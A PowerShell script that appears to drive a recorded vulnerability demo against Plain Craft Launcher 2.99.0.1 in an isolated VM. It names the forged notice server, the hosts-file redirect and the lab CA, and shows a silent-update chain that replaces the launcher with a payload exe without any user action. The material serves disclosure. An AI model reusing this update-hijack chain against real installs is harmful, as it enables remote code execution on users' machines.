# PCL 2.99.0.1 notice/silent-update PoC demo
# Runs elevated in the interactive desktop session, from the USB toolkit.
# ASCII only. Windows PowerShell 5.1 compatible.

$ErrorActionPreference = 'Stop'
$Root = $PSScriptRoot
$Ev = Join-Path $Root 'evidence'
New-Item -ItemType Directory -Force -Path $Ev | Out-Null
$Timeline = Join-Path $Ev 'demo-timeline.csv'
Remove-Item -LiteralPath $Timeline -Force -ErrorAction SilentlyContinue

try { Start-Transcript -Path (Join-Path $Ev 'demo-transcript.txt') -Append | Out-Null } catch { }

. (Join-Path $Root 'lib-gui.ps1')
[void][PclGui]::SetProcessDPIAware()
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Desktop = [Environment]::GetFolderPath('Desktop')
$PclDir = Join-Path $Desktop 'PCL'
$PclExe = Join-Path $PclDir 'Plain Craft Launcher 2.exe'
$PocDir = 'C:\PCLPoC'
$SourceZip = Join-Path $Root 'PCL-2.99.0.1.zip'
$DesktopZip = Join-Path $Desktop 'PCL-2.99.0.1.zip'
$Marker = Join-Path $env:TEMP 'pcl-poc-marker.txt'

$ConsoleW = 0
$ConsoleH = 0
$PclX = 0
$PclW = 0
$Arranger = $null

function Log([string]$Message) {
    $line = '[{0:HH:mm:ss}] {1}' -f (Get-Date), $Message
    try { Add-Content -LiteralPath (Join-Path $Ev 'demo.log') -Value $line -Encoding UTF8 } catch { }
}

function Mark([string]$Id, [string]$Note) {
    $ms = [DateTimeOffset]::Now.ToUnixTimeMilliseconds()
    Add-Content -LiteralPath $Timeline -Value ('{0},{1},{2}' -f $Id, $ms, $Note) -Encoding ASCII
    Log ('mark ' + $Id + ' ' + $Note)
}

function Shot([string]$Name) {
    try {
        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
        $bmp.Save((Join-Path $Ev $Name), [System.Drawing.Imaging.ImageFormat]::Png)
        $g.Dispose()
        $bmp.Dispose()
        Log ('screenshot ' + $Name)
    } catch {
        Log ('screenshot failed: ' + $_.Exception.Message)
    }
}

function Step([string]$Id, [string]$Text) {
    Mark $Id $Text
    Clear-Host
    Write-Host '==============================================================' -ForegroundColor DarkGray
    Write-Host (' PCL 2.99.0.1 PoC demo  |  ' + $Id) -ForegroundColor Cyan
    Write-Host '==============================================================' -ForegroundColor DarkGray
    Write-Host ''
    Write-Host $Text -ForegroundColor Yellow
    Write-Host ''
}

function Section([string]$Text) {
    Write-Host ''
    Write-Host ('--- ' + $Text + ' ---') -ForegroundColor Cyan
}

function Set-PclWindowSize {
    $iniDir = Join-Path $PclDir 'PCL'
    New-Item -ItemType Directory -Force -Path $iniDir | Out-Null
    $ini = Join-Path $iniDir 'Setup.ini'
    $lines = @()
    if (Test-Path -LiteralPath $ini) {
        $lines = @(Get-Content -LiteralPath $ini | Where-Object { $_ -notmatch '^WindowWidth=' -and $_ -notmatch '^WindowHeight=' })
    }
    $lines += ('WindowWidth=' + [string]([Math]::Max(700, $PclW - 30)))
    $lines += ('WindowHeight=' + [string]([Math]::Max(500, $ConsoleH - 70)))
    Set-Content -LiteralPath $ini -Value $lines -Encoding ASCII
}

function Open-DesktopWindow {
    try {
        Start-Process -FilePath 'explorer.exe' -ArgumentList $Desktop | Out-Null
        Start-Sleep -Seconds 2
        for ($i = 0; $i -lt 12; $i++) {
            $w = Get-Process explorer -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq 'Desktop' } | Select-Object -First 1
            if ($w -and $w.MainWindowHandle -ne 0) {
                [PclGui]::Move($w.MainWindowHandle, $PclX, 0, $PclW, $ConsoleH)
                return $w
            }
            Start-Sleep -Milliseconds 500
        }
    } catch { }
    return $null
}

function Refresh-DesktopWindow {
    param($Window)
    if (-not $Window) { return }
    try {
        $ws = New-Object -ComObject WScript.Shell
        $ws.AppActivate($Window.Id) | Out-Null
        Start-Sleep -Milliseconds 300
        $ws.SendKeys('{F5}')
    } catch { }
}

function Close-DesktopWindow {
    param($Window)
    if (-not $Window) { return }
    try { $Window.CloseMainWindow() | Out-Null } catch { }
}

function Show-PclLog {
    $logDir = Join-Path $PclDir 'PCL'
    $logs = @(Get-ChildItem -Path $logDir -Filter 'Log*.txt' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending)
    if ($logs.Count -eq 0) {
        Write-Host '  (no PCL log found)' -ForegroundColor Red
        return
    }
    $log = $logs[0]
    Write-Host ('  PCL log: ' + $log.FullName) -ForegroundColor Gray
    $hits = @(Select-String -LiteralPath $log.FullName -Pattern 'LaunchAdvanceRun|setup' -Encoding UTF8 -ErrorAction SilentlyContinue)
    $printed = 0
    foreach ($h in $hits) {
        $line = $h.Line.Trim()
        $idx = $line.IndexOf('LaunchAdvanceRun')
        if ($idx -gt 80) {
            $start = [Math]::Max(0, $idx - 60)
            $line = '...' + $line.Substring($start, [Math]::Min(220, $line.Length - $start))
        }
        if ($line.Length -gt 260) { $line = $line.Substring(0, 260) + '...' }
        Write-Host ('  ' + $h.LineNumber.ToString() + ': ' + $line) -ForegroundColor Yellow
        $printed++
        if ($printed -ge 6) { break }
    }
    if ($printed -eq 0) {
        Write-Host '  (no LaunchAdvanceRun/setup line in the newest PCL log)' -ForegroundColor Red
    }
}

try {
    & tzutil.exe /s 'China Standard Time' 2>$null | Out-Null
    Write-Host 'Waiting for the desktop ...'
    for ($i = 0; $i -lt 90; $i++) {
        if (Get-Process explorer -ErrorAction SilentlyContinue) { break }
        Start-Sleep -Seconds 1
    }
    Start-Sleep -Seconds 6

    $res = [PclGui]::SetBestResolution()
    Start-Sleep -Seconds 3
    $wa = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
    $screenW = $wa.Width
    $screenH = $wa.Height
    $PclW = [Math]::Max(900, [int]($screenW * 0.52))
    $ConsoleW = $screenW - $PclW - 4
    $PclX = $ConsoleW + 4
    $ConsoleH = $screenH

    $fontSize = 18
    if ($screenH -lt 900) { $fontSize = 16 }
    [void][PclGui]::SetConsoleFont($fontSize)
    $cols = [Math]::Max(60, [int](($ConsoleW - 30) / 8.6))
    $rows = [Math]::Max(24, [int](($ConsoleH - 60) / ($fontSize + 4)))
    Set-ConsoleSize -Columns $cols -Rows $rows
    if ($screenW -ge 1800 -and $screenH -ge 1000) { Set-ConsoleSize -Columns 66 -Rows 36 }

    $hwnd = [PclGui]::GetConsoleWindow()
    [PclGui]::Move($hwnd, 0, 0, $ConsoleW, $ConsoleH)
    $Host.UI.RawUI.WindowTitle = 'PCL 2.99.0.1 PoC - Demo'

    Log ('resolution=' + $res + ' screen=' + $screenW + 'x' + $screenH + ' console=' + $ConsoleW + 'x' + $ConsoleH + ' pcl=' + $PclW)

    if (-not (Test-Path -LiteralPath (Join-Path $PocDir 'Invoke-PCLPoC.ps1'))) {
        throw 'C:\PCLPoC is missing; prepare.ps1 did not copy the PoC toolkit.'
    }

    $Arranger = Start-Process -FilePath 'powershell.exe' -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', (Join-Path $Root 'arrange-windows.ps1'),
        '-ConsoleHwnd', ([string]$hwnd.ToInt64()),
        '-X', '0', '-Y', '0', '-W', ([string]$ConsoleW), '-H', ([string]$ConsoleH),
        '-PclX', ([string]$PclX), '-PclW', ([string]$PclW), '-Minutes', '20'
    ) -PassThru -WindowStyle Hidden

    Step 'step1' 'Windows 10 Enterprise LTSC 2021 - isolated lab VM. PCL 2.99.0.1 (build 415).'
    Write-Host ('  computer : ' + $env:COMPUTERNAME) -ForegroundColor Gray
    Write-Host ('  user     : ' + $env:USERNAME) -ForegroundColor Gray
    Write-Host ('  OS       : ' + (Get-CimInstance Win32_OperatingSystem).Caption) -ForegroundColor Gray
    Write-Host ('  display  : ' + $res + ' (' + $screenW + 'x' + $screenH + ')') -ForegroundColor Gray
    Write-Host '  network  : no NIC attached' -ForegroundColor Gray
    Start-Sleep -Seconds 5

    Step 'step2' 'Copy PCL 2.99.0.1.zip to the Desktop.'
    Copy-Item -LiteralPath $SourceZip -Destination $DesktopZip -Force
    $zipHash = (Get-FileHash -LiteralPath $DesktopZip -Algorithm SHA256).Hash
    Write-Host ('  ' + $DesktopZip) -ForegroundColor Gray
    Write-Host ('  size   : ' + (Get-Item -LiteralPath $DesktopZip).Length + ' bytes') -ForegroundColor Gray
    Write-Host ('  sha256 : ' + $zipHash) -ForegroundColor Gray
    if ($zipHash -ne '4D239A62ED66FB9EBCF4633FD881EB098E9A7E4F296F0E414B58AA2F1F7F7830') {
        throw 'PCL zip hash mismatch: ' + $zipHash
    }
    Start-Sleep -Seconds 5

    Step 'step3' 'Extract the new PCL to Desktop\PCL.'
    if (Test-Path -LiteralPath $PclDir) {
        Remove-Item -LiteralPath $PclDir -Recurse -Force
    }
    Expand-Archive -LiteralPath $DesktopZip -DestinationPath $PclDir -Force
    $pclHash = (Get-FileHash -LiteralPath $PclExe -Algorithm SHA256).Hash
    Write-Host ('  ' + $PclExe) -ForegroundColor Gray
    Write-Host ('  size   : ' + (Get-Item -LiteralPath $PclExe).Length + ' bytes') -ForegroundColor Gray
    Write-Host ('  sha256 : ' + $pclHash) -ForegroundColor Gray
    if ($pclHash -ne '0DB34E19D9EEB6D496D20FABE786EC16BBD36BA6B0CCDC8D29CB7E909C114397') {
        throw 'PCL exe hash mismatch: ' + $pclHash
    }
    Start-Sleep -Seconds 5

    $layers = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers'
    New-Item -Path $layers -Force | Out-Null
    Set-ItemProperty -Path $layers -Name $PclExe -Value '~ HIGHDPIAWARE'

    Step 'step4' 'Run the PoC: forged notice server, hosts entry and a lab CA.'
    Write-Host '  target : pcl2-server-1253424809.file.myqcloud.com' -ForegroundColor Gray
    Write-Host '  hosts  : 127.0.0.1' -ForegroundColor Gray
    Write-Host '  server : https://127.0.0.1:443 (PowerShell TlsListener)' -ForegroundColor Gray
    Write-Host '  notice : id 11002, importantLevel 999' -ForegroundColor Gray
    Write-Host ''
    Write-Host '  notice.json -> actions.setup:' -ForegroundColor Yellow
    Write-Host '    "LaunchAdvanceRun": "C:\\Users\\Public\\pclpoc.exe"' -ForegroundColor White
    Write-Host ''
    Write-Host '  Starting the PoC and PCL ...' -ForegroundColor Cyan
    Write-Host ''

    $closer = Start-Process -FilePath 'powershell.exe' -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', (Join-Path $Root 'close-pcl.ps1'), '-PclDir', $PclDir, '-MaxSeconds', '35'
    ) -PassThru -WindowStyle Hidden

    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $PocDir 'Invoke-PCLPoC.ps1') -Mode launch -PclPath $PclExe -Timeout 40
    Start-Sleep -Seconds 2
    if ($closer -and -not $closer.HasExited) {
        Stop-Process -Id $closer.Id -Force -ErrorAction SilentlyContinue
    }

    Mark 'method1' 'method 1: notice.json -> setup -> LaunchAdvanceRun'
    Section 'Method 1 result'
    if (Test-Path -LiteralPath $Marker) {
        Write-Host '  marker exists: the payload ran.' -ForegroundColor Red
    } else {
        Write-Host '  no marker: LaunchAdvanceRun was not executed.' -ForegroundColor Yellow
    }
    Show-PclLog
    Write-Host ''
    Write-Host '  2.99.0.1 setup blacklist rejects LaunchAdvanceRun before saving it.' -ForegroundColor Yellow
    Mark 'blocked' '2.99.0.1 blocks LaunchAdvanceRun'
    $m1 = Join-Path $Ev 'method1'
    New-Item -ItemType Directory -Force -Path $m1 | Out-Null
    Copy-Item -LiteralPath (Join-Path $PocDir 'poc-run.log') -Destination (Join-Path $m1 'poc-run.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath (Join-Path $PocDir 'backup\server.out.log') -Destination (Join-Path $m1 'server.out.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath (Join-Path $PocDir 'backup\server.err.log') -Destination (Join-Path $m1 'server.err.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -Path (Join-Path $PclDir 'PCL\Log*.txt') -Destination $m1 -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 10

    Step 'step6' 'Delete the entire PCL directory.'
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -like '*Plain*' } | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Test-Path -LiteralPath $PclDir) {
        Remove-Item -LiteralPath $PclDir -Recurse -Force
    }
    Write-Host ('  ' + $PclDir) -ForegroundColor Gray
    Write-Host ('  exists after delete: ' + (Test-Path -LiteralPath $PclDir)) -ForegroundColor Gray
    Write-Host ''
    Write-Host '  A clean copy is extracted again for method 2.' -ForegroundColor DarkGray
    Start-Sleep -Seconds 6

    Step 'step7' 'Method 2: notice.cfg + slientupdate -> silent update -> arbitrary exe.'
    Expand-Archive -LiteralPath $DesktopZip -DestinationPath $PclDir -Force
    Set-PclWindowSize
    Write-Host '  notice.cfg  : 11002|0|0|0|999' -ForegroundColor Gray
    Write-Host '  ServerConfig: Update.Release.DownloadUrls -> https://.../update.zip' -ForegroundColor Gray
    Write-Host '  update.zip  : Plain Craft Launcher 2.exe (payload)' -ForegroundColor Gray
    Write-Host ''
    Write-Host '  Starting the PoC and PCL ...' -ForegroundColor Cyan
    Write-Host ''

    $watcher = Start-Process -FilePath 'powershell.exe' -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', (Join-Path $Root 'watch-staging.ps1'),
        '-PclDir', $PclDir, '-Evidence', $Ev
    ) -PassThru -WindowStyle Hidden

    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $PocDir 'Invoke-PCLPoC.ps1') -Mode update -PclPath $PclExe -Timeout 60 -KeepArtifacts
    Start-Sleep -Seconds 2
    if ($watcher) { Wait-Process -Id $watcher.Id -Timeout 15 -ErrorAction SilentlyContinue }

    Mark 'success' 'method 2: slientupdate -> arbitrary exe (success)'
    Section 'Method 2 result'
    if (-not (Test-Path -LiteralPath $Marker)) {
        throw 'No marker after the update PoC.'
    }
    $markerText = (Get-Content -LiteralPath $Marker -Raw).Trim()
    Write-Host '  marker:' -ForegroundColor Green
    Write-Host ('    ' + $markerText) -ForegroundColor White
    Write-Host ''

    $staging = Join-Path $Ev 'staging.exe'
    $stagingHash = 'missing'
    if (Test-Path -LiteralPath $staging) {
        $stagingHash = (Get-FileHash -LiteralPath $staging -Algorithm SHA256).Hash
        Write-Host ('  staged exe : ' + $staging + ' (' + (Get-Item -LiteralPath $staging).Length + ' bytes)') -ForegroundColor Gray
        Write-Host ('  sha256     : ' + $stagingHash) -ForegroundColor Gray
    } else {
        Write-Host '  staged exe : watcher did not catch it' -ForegroundColor Red
    }

    $entryHash = 'missing'
    $entryOut = $null
    $zipPath = Join-Path $PocDir 'www\update.zip'
    if (Test-Path -LiteralPath $zipPath) {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
        try {
            $entry = $zip.Entries | Where-Object { $_.FullName -eq 'Plain Craft Launcher 2.exe' } | Select-Object -First 1
            if ($entry) {
                $entryOut = Join-Path $Ev 'zip-entry.exe'
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $entryOut, $true)
                $entryHash = (Get-FileHash -LiteralPath $entryOut -Algorithm SHA256).Hash
                Write-Host ('  update.zip : Plain Craft Launcher 2.exe (' + $entry.Length + ' bytes)') -ForegroundColor Gray
                Write-Host ('  entry sha256: ' + $entryHash) -ForegroundColor Gray
            }
        } finally {
            $zip.Dispose()
        }
    }
    if ($stagingHash -ne 'missing' -and $entryHash -ne 'missing') {
        if ($stagingHash -eq $entryHash) {
            Write-Host '  hash match  : the downloaded zip entry ran.' -ForegroundColor Green
        } else {
            Write-Host '  hash mismatch: staging vs zip entry.' -ForegroundColor Red
        }
    }

    $calc = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -like '*calc*' -or $_.MainWindowTitle -like '*Calculator*' } | Select-Object -First 1
    if ($calc) {
        Write-Host '  calc.exe    : started (visible on the right)' -ForegroundColor Green
    } else {
        Write-Host '  calc.exe    : not present in LTSC; marker is the execution proof.' -ForegroundColor Yellow
    }

    $m2 = Join-Path $Ev 'method2'
    New-Item -ItemType Directory -Force -Path $m2 | Out-Null
    Copy-Item -LiteralPath $Marker -Destination (Join-Path $m2 'marker.txt') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath $Marker -Destination (Join-Path $Ev 'marker.txt') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath (Join-Path $PocDir 'poc-run.log') -Destination (Join-Path $m2 'poc-run.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath (Join-Path $PocDir 'backup\server.out.log') -Destination (Join-Path $m2 'server.out.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath (Join-Path $PocDir 'backup\server.err.log') -Destination (Join-Path $m2 'server.err.log') -Force -ErrorAction SilentlyContinue
    Copy-Item -LiteralPath $zipPath -Destination (Join-Path $m2 'update.zip') -Force -ErrorAction SilentlyContinue
    Copy-Item -Path (Join-Path $PclDir 'PCL\Log*.txt') -Destination $m2 -Force -ErrorAction SilentlyContinue
    if (Test-Path -LiteralPath $staging) { Copy-Item -LiteralPath $staging -Destination $m2 -Force -ErrorAction SilentlyContinue }
    if ($entryOut -and (Test-Path -LiteralPath $entryOut)) { Copy-Item -LiteralPath $entryOut -Destination $m2 -Force -ErrorAction SilentlyContinue }
    Start-Sleep -Seconds 8

    $resultText = @(
        'PCL 2.99.0.1 PoC - VM demo result',
        '=================================',
        'VM        : Windows 10 Enterprise LTSC 2021 (isolated, no NIC)',
        'PCL       : 2.99.0.1 (build 415)',
        '',
        'Method 1  : notice.json -> setup -> LaunchAdvanceRun',
        '            BLOCKED by the 2.99.0.1 setup blacklist.',
        '            PCL log: rejected key LaunchAdvanceRun.',
        '            payload marker: absent.',
        '',
        'Method 2  : notice.cfg -> slientupdate -> ServerConfig -> update.zip -> exe',
        '            SUCCESS, zero-click.',
        '            marker: ' + ($markerText -replace "`r?`n", ' | '),
        '            staged exe sha256: ' + $stagingHash,
        '            update.zip entry sha256: ' + $entryHash,
        '',
        'Conclusion: 2.99.0.1 blocks method 1 only; method 2 still',
        'replaces the launcher on exit.'
    ) -join "`r`n"
    Set-Content -LiteralPath (Join-Path $Ev 'RESULT.txt') -Value $resultText -Encoding ASCII

    Section 'Summary'
    Write-Host '  Method 1 (setup -> LaunchAdvanceRun): BLOCKED' -ForegroundColor Yellow
    Write-Host '  Method 2 (slientupdate -> exe)     : SUCCESS' -ForegroundColor Green
    Write-Host ''
    Write-Host '  Opening RESULT.txt on the right ...' -ForegroundColor Cyan

    $notepad = Start-Process -FilePath 'notepad.exe' -ArgumentList (Join-Path $Ev 'RESULT.txt') -PassThru
    Start-Sleep -Seconds 3
    if ($notepad -and $notepad.MainWindowHandle -ne 0) {
        [PclGui]::Move($notepad.MainWindowHandle, $PclX, 0, $PclW, $ConsoleH)
    }
    Mark 'end' 'demo end'
    Shot 'final-desktop.png'
    Start-Sleep -Seconds 14

    try { Stop-Transcript | Out-Null } catch { }
    Start-Sleep -Seconds 2
    & shutdown.exe /s /t 8 /f /c 'PCL PoC demo complete'
} catch {
    $message = $_.Exception.Message
    Write-Host ''
    Write-Host ('ERROR: ' + $message) -ForegroundColor Red
    Log ('ERROR: ' + $message)
    try { Shot 'error.png' } catch { }
    try { Set-Content -LiteralPath (Join-Path $Ev 'ERROR.txt') -Value $_.Exception.ToString() -Encoding UTF8 } catch { }
    Mark 'error' 'demo error'
    Start-Sleep -Seconds 20
    try { Stop-Transcript | Out-Null } catch { }
    & shutdown.exe /s /t 5 /f /c 'PCL PoC demo error'
}
